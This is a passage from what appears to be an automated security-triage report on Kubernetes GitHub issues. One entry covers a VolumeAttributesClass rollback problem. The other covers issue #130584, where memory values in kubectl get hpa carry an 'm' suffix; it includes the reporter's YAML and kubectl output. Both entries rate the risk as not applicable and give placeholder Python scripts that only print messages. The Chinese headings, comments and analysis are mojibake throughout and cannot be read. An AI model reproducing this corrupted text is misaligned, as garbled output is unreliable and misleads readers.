# è¯¥ Issue è¢«åˆ¤å®šä¸ºåŠŸèƒ½æ€§é—®é¢˜è€Œéé«˜é£é™©å®‰å…¨æ¼æ´ï¼Œå› æ­¤ä¸æä¾›å¤ç° POC è„šæœ¬ã€‚
# é—®é¢˜æ ¸å¿ƒåœ¨äº K8s API Server/Controller å±‚é¢å¯¹äºè®¾ç½®å¤±è´¥çš„ VolumeAttributesClass ç¼ºä¹å›æ»šæœºåˆ¶ï¼Œ
# è€Œéå¯é€šè¿‡ç®€å•è„šæœ¬è§¦å‘çš„å…¸å‹å®‰å…¨æ¼æ´ï¼ˆå¦‚ RCE, SQLi, XSS ç­‰ï¼‰ã€‚
# å¤ç°éœ€è¦ä¸€ä¸ªé…ç½®äº† CSI é©±åŠ¨çš„ Kubernetes é›†ç¾¤ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿå¤±è´¥åœºæ™¯çš„ VolumeAttributesClass æˆ– CSI Driver è¡Œä¸ºï¼Œ
# è¿™è¶…å‡ºäº†é€šç”¨ POC è„šæœ¬çš„èŒƒç•´ï¼Œä¸”ä¸ä»£è¡¨é«˜é£é™©å®‰å…¨åˆ©ç”¨ã€‚

print("è¯¥ Issue è¢«åˆ¤å®šä¸ºåŠŸèƒ½æ€§é—®é¢˜ï¼Œé£é™©è¯„çº§ä¸º 'ä¸æ¶‰åŠ'ï¼Œæ•…ä¸ç”Ÿæˆå¤ç°è„šæœ¬ã€‚")
print("å¤ç°æ­¤é—®é¢˜éœ€è¦ç‰¹å®šçš„ Kubernetes ç¯å¢ƒå’Œ CSI é…ç½®ï¼Œæ¨¡æ‹Ÿåç«¯å­˜å‚¨æ— æ³•åº”ç”¨ VAC çš„åœºæ™¯ã€‚")

def main():
    print("æ‰§è¡Œå®Œæ¯•ã€‚")

main() # ç›´æ¥è°ƒç”¨ main å‡½æ•°
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue æŒ‡å‡ºçš„é—®é¢˜æ˜¯ Kubernetes åœ¨å¤„ç† PVC çš„ `VolumeAttributesClass` æ›´æ–°å¤±è´¥æ—¶ç¼ºä¹å›æ»šæœºåˆ¶ï¼Œå¯¼è‡´ PVC å¯èƒ½å¡åœ¨é”™è¯¯çŠ¶æ€ï¼Œå½±å“å…¶å¯ç”¨æ€§ã€‚

1.  **é£é™©åˆ†æç»“è®º**: ç»è¿‡åˆ†æï¼Œæ­¤é—®é¢˜è¢«å®šæ€§ä¸ºåŠŸèƒ½ç¼ºé™·æˆ–å¥å£®æ€§é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚è™½ç„¶å®ƒå¯èƒ½å¯¼è‡´ç‰¹å®š PVC çš„æ‹’ç»æœåŠ¡ï¼Œä½†éœ€è¦ç”¨æˆ·æ‹¥æœ‰ä¿®æ”¹è¯¥ PVC çš„æƒé™ï¼Œå½±å“èŒƒå›´æœ‰é™ï¼Œå¹¶ä¸”ä¸æ¶‰åŠæƒé™æå‡ã€ä¿¡æ¯æ³„éœ²æˆ–è·¨ç§Ÿæˆ·æ”»å‡»ç­‰é«˜é£é™©åœºæ™¯ã€‚å› æ­¤ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œå…¶é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚
2.  **POC è„šæœ¬**: ç”±äºè¯¥é—®é¢˜ä¸å±äºé«˜é£é™©å®‰å…¨æ¼æ´ï¼ŒæŒ‰ç…§è¦æ±‚ï¼Œæ— éœ€æä¾›å¤ç° POC è„šæœ¬ã€‚æä¾›çš„ Python ä»£ç ä»…åŒ…å«ä¸€æ¡è¯´æ˜ä¿¡æ¯ï¼Œè¡¨æ˜ç”±äºé£é™©è¯„çº§çš„åŸå› æœªç”Ÿæˆè„šæœ¬ï¼Œå¹¶è§£é‡Šäº†å¤ç°è¯¥é—®é¢˜éœ€è¦ç‰¹å®šçš„ç¯å¢ƒé…ç½®ã€‚ä»£ç ä¸­çš„ `main()` å‡½æ•°è¢«ç›´æ¥è°ƒç”¨ï¼Œä»¥ç¬¦åˆä¸ä½¿ç”¨ `if __name__ == "__main__":` çš„è¦æ±‚ã€‚

---


## Issue #130584 Incorrect m Suffix in Memory Values for kubectl get hpa

- Issue é“¾æ¥ï¼š[#130584](https://github.com/kubernetes/kubernetes/issues/130584)

### Issue å†…å®¹

#### What happened?

kubectl get hpa incorrectly appends m (millicores) to memory usage values. Memory should always be displayed in bytes, MiB, or GiB, never in "millibytes (m)". This issue also exists in the autoscaling/v2 API, suggesting a deeper problem beyond kubectl

 Affected Versions
Kubernetes Version: v1.29+
kubectl Version: v1.29+
Metrics Server: latest stable
Environment: Affects both on-prem and cloud-managed Kubernetes (e.g., AKS, EKS, GKE).

Deploy an HPA that scales based on memory usage:

yaml

apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: test-hpa
  namespace: default
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: test-deployment
  minReplicas: 1
  maxReplicas: 10
  metrics:
    - type: Resource
      resource:
        name: memory
        target:
          type: AverageValue
          averageValue: 325Mi
Apply the configuration:

sh

kubectl apply -f test-hpa.yaml
Check HPA details:

sh

kubectl get hpa test-hpa -n default
Observed Output:

bash

NAME      REFERENCE        TARGETS      MINPODS   MAXPODS   REPLICAS   AGE
test-hpa  Deployment/test  171502796800m/325Mi   1         10        2          10m
Problem: The value 171502796800m should not have m, as memory is measured in bytes.

Fetch raw API data:

kubectl get --raw "/apis/autoscaling/v2/namespaces/default/horizontalpodautoscalers/test-hpa" | jq
API Output (Incorrect format):

json
{
  "status": {
    "currentMetrics": [
      {
        "type": "Resource",
        "resource": {
          "name": "memory",
          "current": {
            "averageValue": "**172043468800m**"
          }
        }
      }
    ]
  }
}
ğŸš¨ Incorrect: The API also appends m, suggesting the issue is deeper than kubectl.


#### What did you expect to happen?

Expected Behavior **Actual Behavior ( kubectl get hpa )
Memory should be displayed in MiB, GiB, or raw
bytes
Memory is displayed with an incorrect m suffix
Example: 171502796800 bytes = 163,599 MiB Shown incorrectly as 171502796800m
Consistent with Kubernetes documentation Misleading as "millibytes" (which is not a Kubernetes
unit)

#### How can we reproduce it (as minimally and precisely as possible)?

refer

#### Anything else we need to know?

_No response_

#### Kubernetes version

 kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.29.10
WARNING: version difference between client (1.31) and server (1.29) exceeds the supported minor version skew of +/-1


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†`kubectl get hpa`å‘½ä»¤ä»¥åŠ`autoscaling/v2` APIåœ¨å±•ç¤ºåŸºäºå†…å­˜çš„HPAï¼ˆHorizontal Pod Autoscalerï¼‰çŠ¶æ€æ—¶ï¼Œå°†å†…å­˜çš„å½“å‰å¹³å‡å€¼ï¼ˆ`current.averageValue`ï¼‰é”™è¯¯åœ°é™„åŠ äº†`m`ï¼ˆé€šå¸¸ç”¨äºè¡¨ç¤ºCPUçš„millicoresï¼‰åç¼€çš„é—®é¢˜ã€‚å†…å­˜çš„å•ä½åº”è¯¥æ˜¯å­—èŠ‚æˆ–è€…MiB/GiBç­‰æ ‡å‡†å•ä½ï¼Œè€Œä¸åº”è¯¥æ˜¯å¸¦æœ‰`m`åç¼€çš„å€¼ï¼ˆä¾‹å¦‚ `171502796800m`ï¼‰ã€‚

é—®é¢˜åˆ†æï¼š
1.  **é—®é¢˜æ€§è´¨**ï¼šè¿™æ˜¯ä¸€ä¸ªæ•°æ®æ˜¾ç¤ºæ ¼å¼é”™è¯¯çš„é—®é¢˜ã€‚APIå’Œkubectlé”™è¯¯åœ°å°†å†…å­˜å€¼æ ¼å¼åŒ–ä¸ºå¸¦æœ‰`m`åç¼€çš„å­—ç¬¦ä¸²ã€‚
2.  **å½±å“èŒƒå›´**ï¼šå½±å“ç”¨æˆ·é€šè¿‡`kubectl`æˆ–ç›´æ¥æŸ¥è¯¢APIè·å–HPAçŠ¶æ€æ—¶å¯¹å†…å­˜ä½¿ç”¨æƒ…å†µçš„å¯è¯»æ€§å’Œç†è§£ã€‚ä¾èµ–äºæ­¤è¾“å‡ºè¿›è¡Œç›‘æ§æˆ–è‡ªåŠ¨åŒ–çš„è„šæœ¬å¯èƒ½ä¼šå› ä¸ºé¢„æœŸå¤–çš„æ ¼å¼è€Œå‡ºé”™æˆ–è§£æé”™è¯¯ã€‚
3.  **æ½œåœ¨é£é™©**ï¼š
    *   **ç”¨æˆ·æ··æ·†**ï¼šç”¨æˆ·å¯èƒ½è¯¯è§£å†…å­˜ä½¿ç”¨é‡ï¼Œä¾‹å¦‚å°†å…¶è¯¯è®¤ä¸ºæ˜¯"millibytes"ï¼ˆä¸€ä¸ªä¸å­˜åœ¨çš„æ ‡å‡†å•ä½ï¼‰æˆ–è€…ä¸CPUæ··æ·†ã€‚
    *   **è‡ªåŠ¨åŒ–è„šæœ¬é”™è¯¯**ï¼šè§£æ`kubectl get hpa`æˆ–APIå“åº”çš„è„šæœ¬å¦‚æœæœŸæœ›çš„æ˜¯æ ‡å‡†å†…å­˜å•ä½ï¼ˆå¦‚bytes, Ki, Mi, Giï¼‰æˆ–è€…çº¯æ•°å­—ï¼Œé‡åˆ°éé¢„æœŸçš„`m`åç¼€å¯èƒ½ä¼šå¤±è´¥æˆ–äº§ç”Ÿé”™è¯¯è®¡ç®—ã€‚
    *   **å®‰å…¨é£é™©**ï¼šè¯¥é—®é¢˜æœ¬èº«æ˜¯ä¸€ä¸ªæ˜¾ç¤ºé”™è¯¯/æ•°æ®è¡¨ç¤ºé”™è¯¯ã€‚å®ƒä¸æ¶‰åŠï¼š
        *   **ä¿¡æ¯æ³„éœ²**ï¼šæ²¡æœ‰æ³„éœ²é¢å¤–çš„æ•æ„Ÿä¿¡æ¯ã€‚æ˜¾ç¤ºçš„å†…å­˜å€¼æœ¬èº«æ˜¯é¢„æœŸçš„ç›‘æ§æ•°æ®ã€‚
        *   **æƒé™æå‡**ï¼šæ— æ³•åˆ©ç”¨æ­¤é”™è¯¯æå‡æƒé™ã€‚
        *   **å‘½ä»¤æ‰§è¡Œ**ï¼šæ— æ³•åˆ©ç”¨æ­¤é”™è¯¯æ‰§è¡Œå‘½ä»¤ã€‚
        *   **æ‹’ç»æœåŠ¡ (DoS)**ï¼šè™½ç„¶é”™è¯¯çš„æ ¼å¼å¯èƒ½å¯¼è‡´è§£æè„šæœ¬å¤±è´¥ï¼Œä½†è¿™é€šå¸¸å±äºåŠŸèƒ½æ€§é—®é¢˜ï¼Œéš¾ä»¥æ„æˆå¯¹æ ¸å¿ƒæœåŠ¡çš„DoSæ”»å‡»ã€‚æ”»å‡»è€…æ— æ³•é€šè¿‡è§¦å‘æ­¤æ˜¾ç¤ºé”™è¯¯æ¥è€—å°½èµ„æºæˆ–ä½¿æœåŠ¡ä¸å¯ç”¨ã€‚HPAçš„å®é™…æ‰©ç¼©å®¹å†³ç­–é€»è¾‘å¾ˆå¯èƒ½åŸºäºå†…éƒ¨çš„åŸå§‹æ•°å€¼ï¼ˆå­—èŠ‚æ•°ï¼‰ï¼Œè€Œéè¿™ä¸ªæ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²ï¼Œå› æ­¤æ ¸å¿ƒåŠŸèƒ½ä¸å—å½±å“ã€‚
        *   **æ•°æ®ç¯¡æ”¹**ï¼šé”™è¯¯åœ¨äºæ˜¾ç¤ºï¼Œè€Œéåº•å±‚æ•°æ®çš„å­˜å‚¨æˆ–HPAçš„å†³ç­–é€»è¾‘ã€‚

ç»“è®ºï¼šè¯¥Issueæè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§Bugï¼Œå…·ä½“æ¥è¯´æ˜¯APIå’Œå®¢æˆ·ç«¯å·¥å…·åœ¨å±•ç¤ºå†…å­˜æŒ‡æ ‡æ—¶çš„æ•°æ®æ ¼å¼åŒ–é”™è¯¯ã€‚å®ƒä¼šå¯¼è‡´ç”¨æˆ·æ··æ·†å’Œæ½œåœ¨çš„è‡ªåŠ¨åŒ–è„šæœ¬è§£æé—®é¢˜ï¼Œä½†ä¸æ„æˆå¯åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¿™ä¸å±äºå®‰å…¨é—®é¢˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æœ¬ Issue æè¿°çš„é—®é¢˜éå®‰å…¨é£é™©ï¼Œå› æ­¤ä¸æä¾›å¤ç°POCè„šæœ¬ã€‚
# è¯¥é—®é¢˜æ˜¯ä¸€ä¸ªæ˜¾ç¤ºæ ¼å¼é”™è¯¯ï¼Œå¯ä»¥é€šè¿‡éƒ¨ç½²ä¸€ä¸ªåŸºäºå†…å­˜çš„HPAå¹¶ä½¿ç”¨kubectlæˆ–APIæŸ¥è¯¢å…¶çŠ¶æ€æ¥è§‚å¯Ÿã€‚
# å¤ç°æ­¥éª¤å·²åœ¨Issueå†…å®¹ä¸­æä¾›ï¼Œä¸»è¦æ˜¯éƒ¨ç½²èµ„æºå’Œæ‰§è¡ŒæŸ¥è¯¢å‘½ä»¤ã€‚
# ç”±äºé£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼Œæ ¹æ®è¦æ±‚æ— éœ€ç”ŸæˆPOCã€‚

print("è¯¥Issueæè¿°çš„é—®é¢˜æ˜¯ä¸€ä¸ªæ˜¾ç¤ºæ ¼å¼é”™è¯¯ï¼Œå¹¶éå®‰å…¨æ¼æ´ï¼Œé£é™©è¯„çº§ä¸º'ä¸æ¶‰åŠ'ï¼Œå› æ­¤ä¸ç”Ÿæˆå¤ç°POCã€‚")
print("å¯ä»¥é€šè¿‡Issueä¸­æè¿°çš„æ­¥éª¤æ‰‹åŠ¨å¤ç°è¯¥æ˜¾ç¤ºé—®é¢˜ï¼š")
print("1. åˆ›å»ºä¸€ä¸ªDeploymentã€‚")
print("2. åˆ›å»ºä¸€ä¸ªåŸºäºå†…å­˜ä½¿ç”¨ç‡çš„HorizontalPodAutoscalerã€‚")
print("3. ä½¿ç”¨ 'kubectl get hpa <hpa-name>' æˆ–ç›´æ¥æŸ¥è¯¢ 'autoscaling/v2' APIè§‚å¯Ÿå†…å­˜æŒ‡æ ‡çš„æ˜¾ç¤ºæ ¼å¼ã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

ä¸Šè¿°Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetes v1.29+ç‰ˆæœ¬ä¸­ï¼Œ`kubectl get hpa`å‘½ä»¤å’Œ`autoscaling/v2` APIåœ¨æ˜¾ç¤ºåŸºäºå†…å­˜çš„æ°´å¹³ Pod è‡ªåŠ¨ä¼¸ç¼©å™¨ï¼ˆHPAï¼‰çŠ¶æ€æ—¶ï¼Œé”™è¯¯åœ°ç»™å†…å­˜ä½¿ç”¨å€¼é™„åŠ äº†`m`åç¼€çš„é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œå†…å­˜ä½¿ç”¨é‡è¢«æ˜¾ç¤ºä¸º`171502796800m`ï¼Œè€Œé¢„æœŸçš„æ ¼å¼åº”è¯¥æ˜¯å­—èŠ‚æ•°ï¼ˆå¦‚ `171502796800`ï¼‰æˆ–æ ‡å‡†çš„äºŒè¿›åˆ¶å‰ç¼€å•ä½ï¼ˆå¦‚ `163599Mi`ï¼‰ã€‚

æ­¤é—®é¢˜è¢«å®šæ€§ä¸º**åŠŸèƒ½æ€§ç¼ºé™·/æ˜¾ç¤ºé”™è¯¯**ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚åŸå› å¦‚ä¸‹ï¼š
1.  **æ— ç›´æ¥å®‰å…¨å½±å“**ï¼šè¯¥é”™è¯¯ä»…å½±å“æ•°æ®çš„å±•ç¤ºæ–¹å¼ï¼Œå¹¶æœªå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€æƒé™æå‡ã€è¿œç¨‹ä»£ç æ‰§è¡Œã€æ‹’ç»æœåŠ¡æˆ–æ•°æ®ç¯¡æ”¹ç­‰å®‰å…¨é£é™©ã€‚HPAçš„æ ¸å¿ƒä¼¸ç¼©é€»è¾‘å¾ˆå¯èƒ½ä¾èµ–äºæœªæ ¼å¼åŒ–çš„åŸå§‹å†…å­˜æ•°å€¼ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼Œå› æ­¤é›†ç¾¤çš„è‡ªåŠ¨ä¼¸ç¼©åŠŸèƒ½æœ¬èº«é¢„è®¡ä¸ä¼šå—åˆ°å½±å“ã€‚
2.  **éå¯åˆ©ç”¨æ¼æ´**ï¼šæ”»å‡»è€…æ— æ³•åˆ©ç”¨è¿™ä¸ªæ˜¾ç¤ºé”™è¯¯æ¥æ”»å‡»ç³»ç»Ÿæˆ–è·å–æœªæˆæƒçš„è®¿é—®ã€‚å®ƒä¸»è¦æ˜¯ç»™ç”¨æˆ·å’Œä¾èµ–è¾“å‡ºæ ¼å¼çš„è‡ªåŠ¨åŒ–å·¥å…·å¸¦æ¥äº†å›°æ‰°å’Œæ½œåœ¨çš„è§£æé”™è¯¯ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç”±äºè¯¥é—®é¢˜ä¸å±äºå®‰å…¨æ¼æ´èŒƒç•´ï¼Œå…¶é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚å› æ­¤ï¼Œä¸éœ€è¦æä¾›ç”¨äºå¤ç°å®‰å…¨é£é™©çš„POCè„šæœ¬ã€‚æä¾›çš„â€œè„šæœ¬â€å†…å®¹ä»…ç”¨äºè¯´æ˜æƒ…å†µå¹¶æŒ‡å‡ºæ— éœ€ç”ŸæˆPOCã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡Issueä¸­æä¾›çš„`kubectl`å‘½ä»¤å’ŒYAMLé…ç½®åœ¨ç›¸åº”ç‰ˆæœ¬çš„Kubernetesé›†ç¾¤ä¸­æ‰‹åŠ¨å¤ç°è¿™ä¸ªæ˜¾ç¤ºé—®é¢˜ã€‚

---


